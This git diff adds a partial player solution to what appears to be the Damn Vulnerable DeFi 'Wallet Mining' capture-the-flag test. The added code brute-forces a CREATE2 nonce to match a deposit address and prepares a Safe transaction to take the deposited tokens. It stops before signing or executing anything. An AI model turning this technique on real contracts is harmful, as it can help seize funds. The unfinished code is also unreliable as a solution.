@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {Create2} from "@openzeppelin/contracts/utils/Create2.sol";
+import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
 import {
@@ -123,7 +124,61 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
-        
+        // Find the nonce with CREATE2
+        address[] memory _owners = new address[](1);
+        _owners[0] = user;
+        bytes memory initializer =
+            abi.encodeCall(Safe.setup, (_owners, 1, address(0), "", address(0), address(0), 0, payable(0)));
+
+        uint256 nonce;
+
+        bool flag = false;
+        while (!flag) {
+            address target = vm.computeCreate2Address(
+                keccak256(abi.encodePacked(keccak256(initializer), nonce)),
+                keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256 (uint160(address(singletonCopy))))),
+                address(proxyFactory)
+            );
+            if (target == USER_DEPOSIT_ADDRESS) {
+                flag = true;
+                break;
+            }
+            nonce ++;
+        }
+        // Prepate execTransaction call data
+        bytes memory execData;
+        { // avoid stack too deep
+            address to = address(token);
+            uint256 value = 0;
+            bytes memory data = abi.encodeWithSelector(token.transfer.selector, user, DEPOSIT_TOKEN_AMOUNT);
+            Enum.Operation operation = Enum.Operation.Call;
+            uint256 safeTxGas = 100000;
+            uint256 baseGas = 100000;
+            uint256 gasPrice = 0;
+            address gasToken = address(0);
+            address refundReceiver = address(0);
+            uint256 nonce = 0;
+            bytes memory signatures;
+
+            // Calculate tx hash manually since Safe is not deployed yet
+            { // avoid stack too deep
+                bytes32 safeTxHash = keccak256(
+                    abi.encode(
+                        0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8,
+                        to,
+                        value,
+                        keccak256(data),
+                        operation,
+                        safeTxGas,
+                        baseGas,
+                        gasPrice,
+                        gasToken,
+                        refundReceiver,
+                        nonce
+                    )
+                );
+            }
+        }
     }
 
     /**
